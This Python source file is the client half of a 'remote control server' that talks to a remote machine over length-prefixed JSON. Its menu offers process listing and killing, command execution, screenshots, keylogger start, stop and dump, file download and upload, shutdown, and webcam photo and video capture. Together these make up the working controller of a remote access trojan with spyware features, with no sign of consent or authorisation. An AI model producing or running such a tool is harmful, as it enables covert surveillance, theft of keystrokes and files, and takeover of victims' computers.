"""
Simple Python client for the remote control server.
Uses length-prefixed JSON messages and provides a basic CLI menu.
"""

import base64
import json
import os
import socket
import struct
from typing import Any, Dict

SERVER_PORT = 12345


def send_message(conn: socket.socket, payload: Dict[str, Any]) -> None:
    data = json.dumps(payload).encode("utf-8")
    header = struct.pack(">I", len(data))
    conn.sendall(header + data)


def recv_exact(conn: socket.socket, size: int) -> bytes:
    buf = b""
    while len(buf) < size:
        chunk = conn.recv(size - len(buf))
        if not chunk:
            raise ConnectionError("connection closed while receiving data")
        buf += chunk
    return buf


def recv_message(conn: socket.socket) -> Dict[str, Any]:
    header = recv_exact(conn, 4)
    (length,) = struct.unpack(">I", header)
    body = recv_exact(conn, length)
    return json.loads(body.decode("utf-8"))


def save_base64_file(data_b64: str, suggested_name: str) -> str:
    path = os.path.abspath(suggested_name)
    with open(path, "wb") as f:
        f.write(base64.b64decode(data_b64.encode("ascii")))
    return path


def print_menu():
    print(
        """
Commands:
 1) ping
 2) list_processes
 3) kill_process
 4) start_app
 5) screenshot
 6) keylog_start
 7) keylog_stop
 8) keylog_dump
 9) download file
10) upload file
11) shutdown
12) restart
13) webcam_capture
14) webcam_record
 x) exit
"""
    )


def main():
    host = input("Server IP: ").strip()
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        conn.connect((host, SERVER_PORT))
    except (ConnectionError, OSError) as exc:
        print(f"Cannot connect: {exc}")
        return

    try:
        while True:
            print_menu()
            choice = input("Select: ").strip().lower()
            if choice == "x":
                break

            try:
                if choice == "1":
                    send_message(conn, {"action": "ping"})
                elif choice == "2":
                    send_message(conn, {"action": "list_processes"})
                elif choice == "3":
                    pid = int(input("PID to kill: "))
                    send_message(conn, {"action": "kill_process", "pid": pid})
                elif choice == "4":
                    cmd = input("Command to start: ").strip()
                    send_message(conn, {"action": "start_app", "command": cmd})
                elif choice == "5":
                    send_message(conn, {"action": "screenshot"})
                elif choice == "6":
                    send_message(conn, {"action": "keylog_start"})
                elif choice == "7":
                    send_message(conn, {"action": "keylog_stop"})
                elif choice == "8":
                    send_message(conn, {"action": "keylog_dump"})
                elif choice == "9":
                    path = input("Remote file path: ").strip()
                    send_message(conn, {"action": "download", "path": path})
                elif choice == "10":
                    local = input("Local file to upload: ").strip()
                    remote = input("Remote path to write: ").strip()
                    with open(local, "rb") as f:
                        data_b64 = base64.b64encode(f.read()).decode("ascii")
                    send_message(conn, {"action": "upload", "path": remote, "data": data_b64})
                elif choice == "11":
                    send_message(conn, {"action": "shutdown"})
                elif choice == "12":
                    send_message(conn, {"action": "restart"})
                elif choice == "13":
                    send_message(conn, {"action": "webcam_capture"})
                elif choice == "14":
                    seconds = int(input("Record seconds (default 5): ") or "5")
                    send_message(conn, {"action": "webcam_record", "seconds": seconds})
                else:
                    print("Unknown choice")
                    continue

                resp = recv_message(conn)
                status = resp.get("status")
                data = resp.get("data")
                encoding = resp.get("encoding")

                if encoding and status == "ok":
                    if encoding.startswith("base64_png"):
                        path = save_base64_file(data, "screenshot.png")
                        print(f"Screenshot saved to {path}")
                    elif encoding.startswith("base64_jpg"):
                        path = save_base64_file(data, "webcam.jpg")
                        print(f"Webcam image saved to {path}")
                    elif encoding.startswith("base64_mp4"):
                        path = save_base64_file(data, "webcam.mp4")
                        print(f"Webcam video saved to {path}")
                    elif encoding.startswith("base64_file"):
                        path = save_base64_file(data, "download.bin")
                        print(f"File saved to {path}")
                    else:
                        print(f"Unknown encoding: {encoding}")
                else:
                    print(f"Status: {status}, Data: {data}")

            except (ConnectionError, OSError, json.JSONDecodeError) as exc:
                print(f"Connection error: {exc}")
                break
            except ValueError as exc:
                print(f"Invalid input: {exc}")
    finally:
        conn.close()


if __name__ == "__main__":
    main()
